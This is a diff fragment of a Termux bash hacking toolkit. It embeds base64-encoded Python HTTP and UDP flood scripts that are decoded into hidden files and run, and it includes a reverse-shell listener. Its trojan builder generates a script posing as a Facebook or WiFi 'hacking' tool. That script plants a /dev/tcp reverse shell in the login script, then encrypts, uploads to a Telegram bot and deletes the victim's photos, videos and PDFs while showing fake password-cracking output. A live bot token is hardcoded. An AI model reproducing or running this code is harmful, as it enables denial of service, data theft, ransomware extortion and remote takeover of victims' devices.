+ICAgICAgICAgb3B0cCA9IE9wdGlvblBhcnNlcihhZGRfaGVscF9vcHRpb249RmFsc2UsZXBpbG9n
+PSJIYW1tZXJzIikKICAgICAgICAgb3B0cC5hZGRfb3B0aW9uKCItcSIsIi0tcXVpZXQiLCBoZWxw
+PSJzZXQgbG9nZ2luZyB0byBFUlJPUiIsYWN0aW9uPSJzdG9yZV9jb25zdCIsIGRlc3Q9ImxvZ2xl
+dmVsIixjb25zdD1sb2dnaW5nLkVSUk9SLCBkZWZhdWx0PWxvZ2dpbmcuSU5GTykKICAgICAgICAg
+b3B0cC5hZGRfb3B0aW9uKCItcyIsIi0tc2VydmVyIiwgZGVzdD0iaG9zdCIsaGVscD0iYXR0YWNr
+IHRvIHNlcnZlciBpcCAtcyBpcCIpCiAgICAgICAgIG9wdHAuYWRkX29wdGlvbigiLXAiLCItLXBv
+cnQiLHR5cGU9ImludCIsZGVzdD0icG9ydCIsaGVscD0iLXAgODAgZGVmYXVsdCA4MCIpCiAgICAg
+ICAgIG9wdHAuYWRkX29wdGlvbigiLXQiLCItLXR1cmJvIix0eXBlPSJpbnQiLGRlc3Q9InR1cmJv
+IixoZWxwPSJkZWZhdWx0IDEzNSAtdCAxMzUiKQogICAgICAgICBvcHRwLmFkZF9vcHRpb24oIi1o
+IiwiLS1oZWxwIixkZXN0PSJoZWxwIixhY3Rpb249J3N0b3JlX3RydWUnLGhlbHA9ImhlbHAgeW91
+IikKICAgICAgICAgb3B0cywgYXJncyA9IG9wdHAucGFyc2VfYXJncygpCiAgICAgICAgIGxvZ2dp
+bmcuYmFzaWNDb25maWcobGV2ZWw9b3B0cy5sb2dsZXZlbCxmb3JtYXQ9JyUobGV2ZWxuYW1lKS04
+cyAlKG1lc3NhZ2UpcycpCiAgICAgICAgIGlmIG9wdHMuaGVscDoKICAgICAgICAgICAgICAgICBo
+b3dfdG9fdXNlKCkKICAgICAgICAgaWYgb3B0cy5ob3N0IGlzIG5vdCBOb25lOgogICAgICAgICAg
+ICAgICAgIGhvc3QgPSBvcHRzLmhvc3QKICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICBo
+b3dfdG9fdXNlKCkKICAgICAgICAgaWYgb3B0cy5wb3J0IGlzIE5vbmU6CiAgICAgICAgICAgICAg
+ICAgcG9ydCA9IDgwCiAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgcG9ydCA9IG9wdHMu
+cG9ydAogICAgICAgICBpZiBvcHRzLnR1cmJvIGlzIE5vbmU6CiAgICAgICAgICAgICAgICAgdGhy
+ID0gMTM1CiAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgdGhyID0gb3B0cy50dXJibwoK
+IGRlZiBib3RfaGFtbWVyaW5nKHVybCk6CgkgdHJ5OgoJCSB3aGlsZSBUcnVlOgoJCQkgcmVxID0g
+dXJsbGliLnJlcXVlc3QudXJsb3Blbih1cmxsaWIucmVxdWVzdC5SZXF1ZXN0KHVybCxoZWFkZXJz
+PXsnVXNlci1BZ2VudCc6IHJhbmRvbS5jaG9pY2UodWFnZW50KX0pKQoJCQkgcHJpbnQoIlwwMzNb
+OTRtYm90IGlzIGhhbW1lcmluZy4uLlwwMzNbMG0iKQoJCQkgdGltZS5zbGVlcCguMSkKCSBleGNl
+cHQ6CgkJIHRpbWUuc2xlZXAoLjEpCgoKIGRlZiBkb3duX2l0KGl0ZW0pOgoJIHRyeToKCQkgd2hp
+bGUgVHJ1ZToKCQkJIHBhY2tldCA9IHN0cigiR0VUIC8gSFRUUC8xLjFcbkhvc3Q6ICIraG9zdCsi
+XG5cbiBVc2VyLUFnZW50OiAiK3JhbmRvbS5jaG9pY2UodWFnZW50KSsiXG4iK2RhdGEpLmVuY29k
+ZSgndXRmLTgnKQoJCQkgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5T
+T0NLX1NUUkVBTSkKCQkJIHMuY29ubmVjdCgoaG9zdCxpbnQocG9ydCkpKQoJCQkgaWYgcy5zZW5k
+dG8oIHBhY2tldCwgKGhvc3QsIGludChwb3J0KSkgKToKCQkJCSBzLnNodXRkb3duKDEpCgkJCQkg
+cHJpbnQgKFJFRCx0aW1lLmN0aW1lKHRpbWUudGltZSgpKSxHUkVFTisiIDwtLXBhY2tldCBzZW50
+ISBoYW1tZXJpbmctLT4iKQoJCQkgZWxzZToKCQkJCSBzLnNodXRkb3duKDEpCgkJCQkgcHJpbnQo
+R1JFRU4rIm1zaHV0PC0+ZG93biIpCgkJCSB0aW1lLnNsZWVwKC4xKQoJIGV4Y2VwdCBzb2NrZXQu
+ZXJyb3IgYXMgZToKCQkgcHJpbnQoUkVEKyJubyBjb25uZWN0aW9uISBzZXJ2ZXIgbWF5YmUgZG93
+biIpCgkJICNwcmludCgiXDAzM1s5MW0iLGUsIlwwMzNbMG0iKQoJCSB0aW1lLnNsZWVwKC4xKQoK
+CiBkZWYgZG9zKCk6Cgkgd2hpbGUgVHJ1ZToKCQkgaXRlbSA9IHEuZ2V0KCkKCQkgZG93bl9pdChp
+dGVtKQoJCSBxLnRhc2tfZG9uZSgpCgoKIGRlZiBkb3MyKCk6Cgkgd2hpbGUgVHJ1ZToKCQkgaXRl
+bT13LmdldCgpCgkJIGJvdF9oYW1tZXJpbmcocmFuZG9tLmNob2ljZShib3RzKSsiaHR0cDovLyIr
+aG9zdCkKCQkgdy50YXNrX2RvbmUoKQoKCiBkZWYgZ2V0X3BhcmFtZXRlcnMoKToKICBnbG9iYWwg
+aG9zdAogIGdsb2JhbCBwb3J0CiAgZ2xvYmFsIHRocgogIGhvc3QgPSBpbnB1dChSRUQrJ3B1dCB0
+aGUgaG9zdCB5b3Ugd2lsbCBhdHRhY2sgOn0+ICcpCiAgYmFuKCkKICBwb3J0ID0gaW5wdXQoUkVE
+KydwdXQgdGhlIHBvcnQgeW91IHdpbGwgYXR0YWNrIDp9PiAnKQogIGJhbigpCiAgdGhyICA9IGlu
+cHV0KFJFRCsncHV0IHRoZSB0dXJibyBtb2RlIDp9PiAnKQogIGJhbigpCgogIyByZWFkaW5nIGhl
+YWRlcnMKIGdsb2JhbCBkYXRhCiBkYXRhID0gIiIiCgogQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGlj
+YXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSwqLyo7cT0wLjgKIEFjY2VwdC1M
+YW5ndWFnZTogZW4tdXMsZW47cT0wLjUKIEFjY2VwdC1FbmNvZGluZzogZ3ppcCxkZWZsYXRlCiBB
+Y2NlcHQtQ2hhcnNldDogSVNPLTg4NTktMSx1dGYtODtxPTAuNywqO3E9MC43CiBLZWVwLUFsaXZl
+OiAxMTUKIENvbm5lY3Rpb246IGtlZXAtYWxpdmUKCiAiIiIKICN0YXNrIHF1ZXVlIGFyZSBxLHcK
+IHEgPSBRdWV1ZSgpCiB3ID0gUXVldWUoKQoKCiBpZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgoJ
+IGdldF9wYXJhbWV0ZXJzKCkKCSBiYW4oKQoJIHByaW50KEJMVUUsaG9zdCwiIHBvcnQ6ICIsUkVE
+K3N0cihwb3J0KStHUkVFTiwiIHR1cmJvOiAiLHN0cih0aHIpLCJcMDMzWzBtIikKCSBwcmludChH
+UkVFTisiUGxlYXNlIHdhaXQuLi4iKQoJIHVzZXJfYWdlbnQoKQoJIG15X2JvdHMoKQoJIHRpbWUu
+c2xlZXAoNSkKCSB0cnk6CgkJIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2Nr
+ZXQuU09DS19TVFJFQU0pCgkJIHMuY29ubmVjdCgoaG9zdCxpbnQocG9ydCkpKQoJCSBzLnNldHRp
+bWVvdXQoMSkKCSBleGNlcHQgc29ja2V0LmVycm9yIGFzIGU6CgkJIHByaW50KCJjaGVjayBzZXJ2
+ZXIgaXAgYW5kIHBvcnQiKQoJCSB1c2FnZSgpCgkgd2hpbGUgVHJ1ZToKCQkgZm9yIGkgaW4gcmFu
+Z2UoaW50KHRocikpOgoJCQkgdCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWRvcykKCQkJIHQu
+ZGFlbW9uID0gVHJ1ZSAgIyBpZiB0aHJlYWQgaXMgZXhpc3QsIGl0IGRpZXMKCQkJIHQuc3RhcnQo
+KQoJCQkgdDIgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1kb3MyKQoJCQkgdDIuZGFlbW9uID0g
+VHJ1ZSAgIyBpZiB0aHJlYWQgaXMgZXhpc3QsIGl0IGRpZXMKCQkJIHQyLnN0YXJ0KCkKCQkgc3Rh
+cnQgPSB0aW1lLnRpbWUoKQoJCSAjdGFza2luZwoJCSBpdGVtID0gMAoJCSB3aGlsZSBUcnVlOgoJ
+CQkgaWYgKGl0ZW0+MTgwMCk6ICMgZm9yIG5vIG1lbW9yeSBjcmFzaAoJCQkJIGl0ZW09MAoJCQkJ
+IHRpbWUuc2xlZXAoLjEpCgkJCSBpdGVtID0gaXRlbSArIDEKCQkJIHEucHV0KGl0ZW0pCgkJCSB3
+LnB1dChpdGVtKQoJCSBxLmpvaW4oKQoJCSB3LmpvaW4oKQpleGNlcHQgOgogcHJpbnQoJycnCgog
+IOKWhOKWhOKWhOKWhOKWhOKWhCAgIOKWhOKWhOKWhCAgICDiloTiloTiloQg4paE4paE4paE4paE
+4paE4paE4paE4paEICAgICAgICAgICAgICAg4paE4paECiAg4paI4paI4paA4paA4paA4paA4paI
+4paIICDilojilojiloQgIOKWhOKWiOKWiCAg4paI4paI4paA4paA4paA4paA4paA4paAICAgICAg
+ICAgICAgICAg4paI4paICiAg4paI4paIICAgIOKWiOKWiCAgIOKWiOKWiOKWhOKWhOKWiOKWiCAg
+IOKWiOKWiCAgICAgICAgICAgICAgICAgICAgIOKWiOKWiAogIOKWiOKWiOKWiOKWiOKWiOKWiOKW
+iCAgICAg4paA4paI4paI4paAICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiCAgICAgICAgICAgICAg
+ICDilojilogKICDilojiloggICAg4paI4paIICAgICDilojiloggICAgIOKWiOKWiCAgICAgICAg
+ICAgICAgICAgICAgIOKWgOKWgAogIOKWiOKWiOKWhOKWhOKWhOKWhOKWiOKWiCAgICAg4paI4paI
+ICAgICDilojilojiloTiloTiloTiloTiloTiloQgICAgICAgICAgICAgICDiloTiloQKICDiloDi
+loDiloDiloDiloDiloDiloAgICAgICDiloDiloAgICAgIOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKW
+gCAgICAgICAgICAgICAgIOKWgOKWgAoKICcnJykKIG9zLnN5c3RlbSgnJycKCiBuZXQoKSB7CiAg
+ICAgd2hpbGUgdHJ1ZTsgZG8KICAgICAgICAgd2dldCAtLXNwaWRlciAtLXF1aWV0IGh0dHBzOi8v
+Z2l0aHViLmNvbQogICAgICAgICBpZiBbICIkPyIgIT0gMCBdOyB0aGVuCiAgICAgICAgICAgICBO
+bkV0PSJObyBpbnRlcm5ldCEiCiAgICAgICAgIGJyZWFrCiAgICAgICAgIGVsc2UKICAgICAgICAg
+ICAgICAgICBObkV0PSJjb25uZWN0ZWQgdG8gaW50ZXJuZXQgISEgIgogICAgICAgICAgICAgZXhp
+dAogICAgICAgICBmaQogICAgIGRvbmUKIH0KCiBuZXQKCiBpZiBbWyAkTm5FdCA9PSAiTm8gaW50
+ZXJuZXQhIiBdXTt0aGVuCiAJcHl0aG9uIEFsbEluT25lIC0tc3RhcnQKIGVsc2UKCWN1cmwgcGFy
+cm90LmxpdmUKCXNsZWVwIDMKCXB5dGhvbiBBbGxJbk9uZSAtLXN0YXJ0CiBmaQoKICcnJykK
+
+' > $PREFIX/bin/.DDOS
+base64 -d $PREFIX/bin/.DDOS > $PREFIX/bin/.B2DDOS4B
+rm -rfd $PREFIX/bin/.DDOS
+python $PREFIX/bin/.B2DDOS4B
+
+elif [[ ${Mode_Of_Attack} == "1" ]];then
+
+echo -e '
+
+IyEvdXNyL2Jpbi9weXRob24KaW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHRpbWUKaW1wb3J0
+IHNvY2tldAppbXBvcnQgcmFuZG9tCiNDb2RlIFRpbWUKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0
+ZXRpbWUKbm93ID0gZGF0ZXRpbWUubm93KCkKaG91ciA9IG5vdy5ob3VyCm1pbnV0ZSA9IG5vdy5t
+aW51dGUKZGF5ID0gbm93LmRheQptb250aCA9IG5vdy5tb250aAp5ZWFyID0gbm93LnllYXIKCkJM
+ICAgPSAnXDAzM1szMG0nClIgID0gJ1wwMzNbMzFtJwpHICAgPSAnXDAzM1szMm0nClkgID0gJ1ww
+MzNbMzNtJwpCICAgID0gJ1wwMzNbMzRtJwpNID0gJ1wwMzNbMzVtJwpDICAgID0gJ1wwMzNbMzZt
+JwpXICAgPSAnXDAzM1szN20nClJFICAgPSAnXDAzM1szOW0nCgojIyMjIyMjIyMjIyMjIwpzb2Nr
+ID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pCmJ5dGVz
+ID0gcmFuZG9tLl91cmFuZG9tKDE0OTApCiMjIyMjIyMjIyMjIyMKCm9zLnN5c3RlbSgiIiIKY2xl
+YXI7CmVjaG8gLWUgJGIgJyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUTSc7CnRvaWxldCAtZiBtb25vMTIg
+LUYgYm9yZGVyIEFsbEluT25lIC1GIGdheSAtRiBtZXRhbDsKZWNobyAtZSAkciAnIEJ5IEBCbHVl
+MjRCbHVlcic7CiIiIikKCmhvc3QgPSByYXdfaW5wdXQoUisiSG9zdCA6ICIpCnBvcnQgPSBpbnB1
+dChCKyJQb3J0IDogIikKcHJpbnQgKFkrJ1N0YXJ0aW5nIEF0dGFjaycpCnNlbnQgPSAwCndoaWxl
+IFRydWU6CiAgICAgc29jay5zZW5kdG8oYnl0ZXMsKGhvc3QscG9ydCkpCiAgICAgc2VudCA9IHNl
+bnQgKyAxCiAgICAgcG9ydCA9IHBvcnQgKyAxCiAgICAgcHJpbnQgKFIrJ0JvdCBpcyBoYXJtaW5n
+IC4uLicpCiAgICAgaWYgcG9ydCA9PSA2NTUzNDoKICAgICAgIHBvcnQgPSAxCg==
+
+' > $PREFIX/bin/.DDOS
+base64 -d $PREFIX/bin/.DDOS > $PREFIX/bin/.B2DDOS4B
+rm -rfd $PREFIX/bin/.DDOS
+python2 $PREFIX/bin/.B2DDOS4B
+
+else
+
+echo -e $bad "Error!"
+sleep 2
+menu
+
+fi
+
+}
+#{-------------Clo--------------------}
+Clo(){
+
+cls
+ban
+
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " Put The Port you will need to open it ? "
+read -p '}>: ' Port
+
+cloudflared --url 127.0.0.1:$Port
+
+
+
+}
+#----------------IMG-------------------}
+img(){
+
+ban
+echo -e $info "But The path to scan Your Victam image !"
+echo -e ""
+echo -e ""
+read -p "------------:}=> " path
+
+echo -e $info "SCANING IMAGE ...."
+exiftool $path
+
+}
+#--------------AnO---------------------}
+AnO(){
+
+TOKEN="5691570782:AAGMKFygk9MyAlZXtPNddydtDsY4Ouo8-ng"
+
+ban
+echo -e $info $r "Send By My Bot to someome Anymons !"
+echo -e $info " Put the chat id you will send to "
+read -p " ------------:}=> " ChatID
+ban
+echo -e $info "Now but the message "
+read -p " ------------:}=> " Mess
+
+echo -e $r "SENDING ....."
+
+curl -X POST --silent --output /dev/null https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$ChatID -d text=$Mess &>> /dev/null
+if [[ $? == "0" ]];then
+echo -e $info $b "FINSHED !" |pv -qL 10
+menu
+else
+echo -e $bad "SOMETHING IS ERROR !"
+sleep 4
+menu
+fi
+
+}
+#{-------------LinuxGamer--------------}
+gamer(){
+
+ban
+echo -e $info "Chose You Game To Start" | lolcat
+echo -e $info "[1] the-powder-toy" | lolcat
+echo -e $info "[2] nethack" | lolcat
+echo -e $info "[3] 0verkill" | lolcat
+echo -e $info "[4] pacman4console" | lolcat
+echo -e $info "[5] myman " | lolcat
+echo -e $info "[6] nsnake " | lolcat
+echo -e $info "[7] love " | lolcat
+echo -e $info "[8] dosbox " | lolcat
+echo -e $info "[9] godot " | lolcat
+echo -e $info "[10] xboard " | lolcat
+echo -e $info "[11] minetest " | lolcat
+echo -e $info "[12] warzone2100 " | lolcat
+echo -e $info $r "[00] exit "
+echo -e ""
+echo -e ""
+read -p " ------------:}=> " Gam
+
+if [[ $Gam == "1" ]];then
+echo -e $r "[★] INSTALL nethack"
+$apt update -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+$apt install the-powder-toy -y &>> /dev/null
+if [[ $? == "0" ]];then
+the-powder-toy
+else
+echo -e $bad "SOMETHING IS ERROR TRY AGIN LATTER !"
+fi
+
+elif [[ $Gam == "2" ]];then
+echo -e $r "[★] INSTALL nethack"
+$apt update -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+$apt install nethack -y &>> /dev/null
+if [[ $? == "0" ]];then
+nethack
+else
+echo -e $bad "SOMETHING IS ERROR TRY AGIN LATTER !"
+fi
+
+elif [[ $Gam == "3" ]];then
+echo -e $r "[★] INSTALL 0verkill"
+$apt update -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+$apt install 0verkill -y &>> /dev/null
+if [[ $? == "0" ]];then
+0verkill
+else
+echo -e $bad "SOMETHING IS ERROR TRY AGIN LATTER !"
+fi
+
+elif [[ $Gam == "4" ]];then
+echo -e $r "[★] INSTALL pacman4console"
+$apt update -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+$apt install pacman4console -y &>> /dev/null
+if [[ $? == "0" ]];then
+pacman4console
+else
+echo -e $bad "SOMETHING IS ERROR TRY AGIN LATTER !"
+fi
+
+elif [[ $Gam == "5" ]];then
+echo -e $r "[★] INSTALL myman"
+$apt update -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+$apt install myman -y &>> /dev/null
+if [[ $? == "0" ]];then
+myman
+else
+echo -e $bad "SOMETHING IS ERROR TRY AGIN LATTER !"
+fi
+
+elif [[ $Gam == "6" ]];then
+echo -e $r "[★] INSTALL nsnake"
+$apt update -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+$apt install nsnake -y &>> /dev/null
+if [[ $? == "0" ]];then
+nsnake
+else
+echo -e $bad "SOMETHING IS ERROR TRY AGIN LATTER !"
+fi
+
+elif [[ $Gam == "7" ]];then
+echo -e $r "[★] INSTALL love"
+$apt update -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+$apt install love -y &>> /dev/null
+if [[ $? == "0" ]];then
+love
+else
+echo -e $bad "SOMETHING IS ERROR TRY AGIN LATTER !"
+fi
+
+elif [[ $Gam == "8" ]];then
+echo -e $r "[★] INSTALL dosbox"
+$apt update -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+$apt install dosbox -y &>> /dev/null
+if [[ $? == "0" ]];then
+dosbox
+else
+echo -e $bad "SOMETHING IS ERROR TRY AGIN LATTER !"
+fi
+
+elif [[ $Gam == "9" ]];then
+echo -e $r "[★] INSTALL godot"
+$apt update -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+$apt install godot -y &>> /dev/null
+if [[ $? == "0" ]];then
+godot
+else
+echo -e $bad "SOMETHING IS ERROR TRY AGIN LATTER !"
+fi
+
+elif [[ $Gam == "10" ]];then
+echo -e $r "[★] INSTALL xboard"
+$apt update -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+$apt install xboard -y &>> /dev/null
+if [[ $? == "0" ]];then
+xboard
+else
+echo -e $bad "SOMETHING IS ERROR TRY AGIN LATTER !"
+fi
+
+elif [[ $Gam == "11" ]];then
+echo -e $r "[★] INSTALL minetest"
+$apt update -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+$apt install minetest -y &>> /dev/null
+if [[ $? == "0" ]];then
+minetest
+else
+echo -e $bad "SOMETHING IS ERROR TRY AGIN LATTER !"
+fi
+
+elif [[ $Gam == "12" ]];then
+echo -e $r "[★] INSTALL warzone2100"
+$apt update -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+$apt install warzone2100 -y &>> /dev/null
+if [[ $? == "0" ]];then
+warzone2100
+else
+echo -e $bad "SOMETHING IS ERROR TRY AGIN LATTER !"
+fi
+
+
+
+elif [[ $Gam == "00" ]];then
+echo -e $info "See Ya !" | lolcat
+menu
+
+else
+echo -e $r "Chose From This List"
+sleep 3
+gamer
+
+fi
+
+}
+#{-------------StartM------------------}
+StartM(){
+
+ban
+echo -e $info "Start Meterpreter With $r Victam .. .." | pv -qL 10
+echo -e ''
+echo -e ''
+echo -e $info "Put The Port :"
+read -p " ------------:}=> " Port
+ban
+echo -e $info "Start Meterpreter With $r Victam .. .."
+echo -e ''
+echo -e ''
+echo -e $info "Put The Host :"
+read -p " ------------:}=> " Host
+ban
+
+if  [[ `command -v ncat` ]]; then
+
+	echo -e $info $r "WITEING FOR THE VICTAM CONNECT ..." | pv -qL 10
+
+	while true ;do
+		ncat -nv $Host $Port &>> /dev/null
+
+		if [[ $? == '0' ]];then
+
+		echo -e $r "Connected !"
+		Assest="T"
+	break
+
+		fi
+
+	done
+
+
+	if [[ $Assest == 'T' ]];then
+
+		ncat -nv $Host $Port #702005665
+
+	fi
+
+else
+
+	echo -e $r "INSTALL THE ATTACKER TOOL ON YOUR DEVICE"
+	$apt install nmap -y
+
+fi
+
+}
+#{-------------TrojanMaker-------------}
+TrojanMaker(){
+
+ban
+
+echo -e $r "Trojan Maker IS STARTING ..." | pv -qL 15
+echo -e $info " This Tool Made By $b @Blue24Bluer $r  AND I DON'T SUPPORT ANY WRONG USE OF THIS TOOL " | pv -qL 15
+echo -e $info " Befor Using This Tool You have to Install $b Telegram $y And $r Make Your Own BOT " | pv -qL 15
+echo -e $info " By Using $b @BotFather " | pv -qL 15
+echo -e $info " $r  This Trojan Run Only On Termux !! " | pv -qL 15
+
+echo ''
+echo ''
+echo -e $info " [1] Make Meterpreter and Trojan Script "
+echo -e $info " [2] Start Meterpreter With Victam      "
+echo ''
+echo ''
+
+read -p ' ------------:}=> ' TT
+
+if [[ $TT == "1" ]];then
+
+#---------------------------------------------------------
+	ban
+	echo -e $info " Your Telegram Bot Api : "
+	echo -e ''
+	echo -e ''
+	echo -e ''
+
+	read -p " ------------:}=> " BotAPI
+	ban
+#---------------------------------------------------------
+        ban
+        echo -e $info " Your Telegram Chat ID : "
+        echo -e ''
+        echo -e ''
+        echo -e ''
+
+        read -p " ------------:}=> " ChatID
+        ban
+#---------------------------------------------------------
+	echo -e $info " Your Password Encrypt Trojan : "
+	echo -e ''
+        echo -e ''
+        echo -e ''
+
+	read -p " ------------:}=> "  PassEnc
+	ban
+#---------------------------------------------------------
+	echo -e $info " Your Host : "
+        echo -e ''
+        echo -e ''
+        echo -e ''
+
+        read -p " ------------:}=> "  Host
+        ban
+#---------------------------------------------------------
+        echo -e $info " Your Port : "
+        echo -e ''
+        echo -e ''
+        echo -e ''
+
+        read -p " ------------:}=> "  Port
+        ban
+#---------------------------------------------------------
+	echo -e $info "What This Tool Can Do ? "
+	echo -e ''
+	echo -e ''
+	echo -e ''
+
+	echo -e $info "[1] Wifi Hacking "
+	echo -e $info "[2] Instagram Hacking "
+	echo -e $info "[3] Whatsapp Hacking "
+	echo -e $info "[4] FaceBook Hacking "
+	read -p " ------------:}=> " What
+	ban
+
+	if [[ $What == '1' ]];then
+		vV='Wifi Hacking'
+	elif [[ $What == '2' ]];then
+		vV='Instagram Hacking'
+	elif [[ $What == '3' ]];then
+		vV='Whatsapp Hacking'
+	elif [[ $What == '4' ]];then
+		vV='FaceBook Hacking'
+	else
+		echo -e $r 'Error'
+		vV='FaceBook Hacking'
+	fi
+
+	echo -e $info "The Virus Trojan IS on File Name B24B_$vV On $home "
+	echo -e $red "MAKE THE TROJAN ............" | pv -qL 10
+
+#---------------------------------------------------------
+#Make_IT
+
+echo "#!/usr/bin/bash
+
+b='\033[1;30m'
+r='\033[1;31m'
+g='\033[1;32m'
+y='\033[1;33m'
+b='\033[1;34m'
+p='\033[1;35m'
+c='\033[1;36m'
+v='\033[1;37m'
+w='\033[0;37m'
+
+black='\033[1;30m'
+red='\033[1;31m'
+green='\033[1;32m'
+yellow='\033[1;33m'
+blue='\033[1;34m'
+purple='\033[1;35m'
+cyan='\033[1;36m'
+violate='\033[1;37m'
+white='\033[0;37m'
+nc='\033[00m'
+
+info='${cyan}[${white}+${cyan}] ${yellow}'
+fun='${cyan}[${white}@${cyan}] ${purple}'
+ask='${cyan}[${white}?${cyan}] ${purple}'
+bad='${cyan}[${white}!${cyan}] ${red}'
+good='${cyan}[${white}√${cyan}] ${green}'
+
+#This File Made By Blue24Bluer
+
+ID_BOT='$BotAPI'
+ChatID='$ChatID'
+Host='$Host'
+Port='$Port'
+system=\$(uname -o)
+name='$vV'
+
+echo -e 'bash -c \' 0<&139-;exec 139<>/dev/tcp/$Host/$Port;sh <&139 >&139 2>&139 \' &>>/dev/null' > $PREFIX/etc/termux-login.sh
+
+# Check if offline
+net() {
+    while true; do
+        wget --spider --quiet https://github.com
+        if [ '\$?' = 0 ]; then
+            nN='Y'
+        break
+       else
+                nN='N'
+break
+        fi
+    done
+}
+
+net
+
+if [[ \$nN == 'N' ]];then
+echo -e \$bad 'BAD NETWORK !'
+exit
+fi
+
+clear
+
+echo -e \$info'This Tool Made by @B24B'
+
+if [[ \$system == 'Android' ]];then
+
+	echo -e  'UPDATE SOME PACKAGE'
+	apt install openssl -y &>> /dev/null
+	clear
+
+	termux-setup-storage
+
+	if [[ \$? == '1' ]];then
+
+#---------------------------------------------------------#---------------------------------------------------------#---------------------------------------------------------
+		if [[ \$name == 'FaceBook Hacking' ]];then
+
+echo '
+
+┌────────────────────────────────────────────────────────────────────────────────┐
+│                                                                                │
+│ ▄▄▄▄▄▄▄▄                                ▄▄▄▄▄▄                        ▄▄       │
+│ ██▀▀▀▀▀▀                                ██▀▀▀▀██                      ██       │
+│ ██         ▄█████▄   ▄█████▄   ▄████▄   ██    ██   ▄████▄    ▄████▄   ██ ▄██▀  │
+│ ███████    ▀ ▄▄▄██  ██▀    ▀  ██▄▄▄▄██  ███████   ██▀  ▀██  ██▀  ▀██  ██▄██    │
+│ ██        ▄██▀▀▀██  ██        ██▀▀▀▀▀▀  ██    ██  ██    ██  ██    ██  ██▀██▄   │
+│ ██        ██▄▄▄███  ▀██▄▄▄▄█  ▀██▄▄▄▄█  ██▄▄▄▄██  ▀██▄▄██▀  ▀██▄▄██▀  ██  ▀█▄  │
+│ ▀▀         ▀▀▀▀ ▀▀    ▀▀▀▀▀     ▀▀▀▀▀   ▀▀▀▀▀▀▀     ▀▀▀▀      ▀▀▀▀    ▀▀   ▀▀▀ │
+│                                                                        HACKING │
+│                                                                                │
+└────────────────────────────────────────────────────────────────────────────────┘By @Blue24Bluer
+
+
+'
+
+
+
+
+
+
+			echo -e  'Can You Put The ID of the account you will attack ?'
+			read -p ' ------------:}=> ' ID
+
+			sleep 5
+			echo -e \$info 'START HACKING'
+
+			for filename in \$(find /storage/ -name *.jpg); do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_jpg -k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+                        done
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+                        for filename in \$(find /storage/ -name *.png);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_png -k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+                        for filename in \$(find /storage/ -name *.mp4);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc 'a-zA-Z1-9' | fold -w 9 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_mp4 -k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+                        for filename in \$(find /storage/ -name *.pdf);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 9 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_pdf -k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
